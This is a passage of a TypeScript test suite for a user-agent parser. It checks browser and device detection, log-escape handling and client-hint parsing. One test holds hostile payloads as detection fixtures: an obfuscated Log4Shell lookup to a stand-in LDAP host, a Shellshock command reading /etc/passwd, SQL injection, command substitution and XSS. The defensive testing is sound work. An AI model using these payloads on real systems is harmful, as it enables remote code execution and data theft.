  expectUa("Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", {
    browser: "Chrome", os: "ChromeOS", osversion: "14541.0.0", device: "desktop", reduced: 2,
  });
  // Edge 91 predates reduction: no 0.0.0 and no frozen-platform note.
  expectUa(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    { browser: "Microsoft Edge", bversion: "91.0.864.59", engine: "Blink", eversion: "91", reduced: 0 },
  );
  // A tablet's reduced string drops the Mobile token.
  expectUa("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", {
    device: "tablet",
  });
});

test("verifier: MDN's Firefox and Safari examples", () => {
  expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0", {
    browser: "Firefox", bversion: "115.0", engine: "Gecko", eversion: "115.0", os: "macOS Catalina", osversion: "10.15", device: "desktop",
  });
  expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", {
    browser: "Safari", bversion: "17.0", engine: "WebKit", eversion: "605.1.15", osversion: "10.15.7", reduced: 0,
  });
  expectUa("Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0", {
    browser: "Firefox for Android", engine: "Gecko", os: "Android", device: "mobile",
  });
});

test("verifier: KaiOS, Windows Phone models and old Android spellings", () => {
  expectUa("Mozilla/5.0 (Mobile; Nokia_8110_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5", {
    browser: "KaiOS browser", engine: "Gecko", os: "KaiOS", osversion: "2.5", device: "mobile",
  });
  // JioPhone strings also carry an Android token.
  expectUa("Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5", {
    os: "KaiOS", browser: "KaiOS browser",
  });
  expectUa("Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)", {
    os: "Windows Phone", osversion: "8.0", device: "mobile", model: "NOKIA Lumia 920", engine: "Trident",
  });
  expectUa("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063", {
    model: "Microsoft Lumia 950",
  });
  expectUa("Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", {
    browser: "Android Browser (stock)", bversion: "4.0", engine: "WebKit", eversion: "534.30", model: "LG-L160L", device: "mobile",
  });
  // A TV browser with Safari/ but no Version/ is not Safari.
  expectUa("Mozilla/5.0 (SMART-TV; LINUX; Tizen 6.0) AppleWebKit/537.36 (KHTML, like Gecko) 85.0.4183.93/6.0 TV Safari/537.36", {
    browser: "Unidentified WebKit or Blink browser", os: "Tizen", device: "tv",
  });
});

test("verifier: payloads, including obfuscated Log4Shell", () => {
  const tones = (ua: string) => payloadOf(ua).map((f) => f.tone);
  const payloadOf = (ua: string) => analyzeUa(ua).findings;
  assert.ok(tones("${${lower:j}ndi:${lower:l}dap://198.51.100.7/a}").includes("danger"));
  assert.ok(payloadOf("() { :; }; /bin/bash -c 'cat /etc/passwd'").some((f) => /CVE-2014-6271/.test(f.text)));
  assert.ok(payloadOf("Mozilla/5.0' AND SLEEP(5)-- ").some((f) => /SQL injection/.test(f.text)));
  assert.ok(payloadOf("Mozilla/5.0 $(id)").some((f) => /shell command/.test(f.text)));
  assert.ok(payloadOf("<script>alert(1)</script>").some((f) => /HTML or script/.test(f.text)));
  // Ordinary strings carry no payload findings.
  const clean = analyzeUa("Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0");
  assert.equal(clean.findings.length, 0);
});

test("verifier: log escapes, brand lists and header detection", () => {
  // Apache writes a backslash as \\ and " as \"; nginx writes " as \x22.
  assert.equal(extractLogUa('1.2.3.4 - - [1/Jan/2026:00:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "a\\\\x41b"'), "a\\x41b");
  assert.equal(extractLogUa('1.2.3.4 - - [1/Jan/2026:00:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "a\\x22b\\"c"'), 'a"b"c');
  // RFC 8941: a trailing comma fails the whole list; escaped quotes are allowed.
  assert.equal(parseBrandList('"A";v="1", ').ok, false);
  const esc = parseBrandList('"Not\\"A;Brand";v="99", "Chromium";v="124"');
  assert.ok(esc.ok);
  assert.equal(esc.ok && esc.brands[0].brand, 'Not"A;Brand');
  assert.equal(esc.ok && esc.brands[0].grease, true);
  for (const g of [" Not A;Brand", "Not)A;Brand", "Not/A)Brand", "Not_A Brand", "Not-A.Brand", "Not.A/Brand"]) {
    assert.ok(isGreaseBrand(g), g);
  }
  assert.equal(isGreaseBrand("Google Chrome"), false);
  // A URL on its own line is a string to parse, not a header called http.
  const out = parseInput("http://example.com/bot\nhttps://example.net/");
  assert.equal(out.entries.length, 2);
  assert.equal(out.ignored, 0);
});

test("verifier: Windows version from Sec-CH-UA-Platform-Version", () => {
  const hints = (v: string) =>
    parseInput(`Sec-CH-UA-Platform: "Windows"\nSec-CH-UA-Platform-Version: "${v}"`).hints!.findings.map((f) => f.text).join(" ");
  // Microsoft: 13.0.0 and above is Windows 11, 1.0.0 to 10.0.0 is Windows 10, 0.x is earlier.
  assert.match(hints("15.0.0"), /Windows 11/);
  assert.match(hints("13.0.0"), /Windows 11/);
  assert.match(hints("10.0.0"), /Windows 10/);
  assert.match(hints("0.3.0"), /older than Windows 10/);
});

test("verifier: the total analysis budget bounds a hostile paste", () => {
  const line = ("$(" + "() {").repeat(2000).slice(0, MAX_UA_LENGTH);
  const text = Array(240).fill(line).join("\n");
  const t0 = performance.now();
  const out = parseInput(text);
  const ms = performance.now() - t0;
  assert.ok(ms < 1500, `took ${ms.toFixed(0)} ms`);
  const analyzed = out.entries.reduce((n, e) => n + (e.kind === "ua" ? e.analysis.ua.length : 0), 0);
  assert.ok(analyzed <= MAX_ANALYZED_CHARS);
  assert.equal(out.entries.length + out.truncated, 240);
  assert.ok(out.truncated > 0);
  // Over the whole-paste cap: refused with a message, not parsed.
  const big = parseInput("a".repeat(2_000_001));
  assert.ok(big.error && /2,000,000/.test(big.error));
  assert.equal(big.entries.length, 0);
});

console.log(`user-agent-parser: ${passed} tests passed`);
